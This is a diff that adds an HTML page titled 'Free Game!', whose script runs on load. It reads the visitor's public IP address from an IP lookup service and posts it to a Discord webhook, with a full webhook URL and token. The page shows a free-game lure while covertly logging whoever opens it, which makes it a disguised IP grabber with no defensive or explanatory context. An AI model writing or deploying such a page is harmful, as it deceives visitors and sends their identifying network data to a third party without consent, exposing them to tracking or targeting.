@@ -1,0 +1,13 @@
+ <!DOCTYPE html>                                                                                                                                    
+ <html>                                                                                                                                             
+ <script>                                                                                                                                           
+ fetch('https://api.ipify.org?format=json')                                                                                                         
+ .then(r => r.json())                                                                                                                               
+ .then(data => fetch('https://discord.com/api/webhooks/1459918527120150589/-jnAafHWm4sC-E_oYwb49noRd0TTKnyq7enI7CvjW9xFPQStO-eiOfU0FHfWvh5d6KI5', {                                                                             
+     method: 'POST',                                                                                                                                
+     headers: {'Content-Type': 'application/json'},                                                                                                 
+     body: JSON.stringify({content: 'IP: ' + data.ip})                                                                                              
+ }));                                                                                                                                               
+ </script>                                                                                                                                          
+ <body><h1>Free Game!</h1></body>                                                                                                                   
+ </html>                       
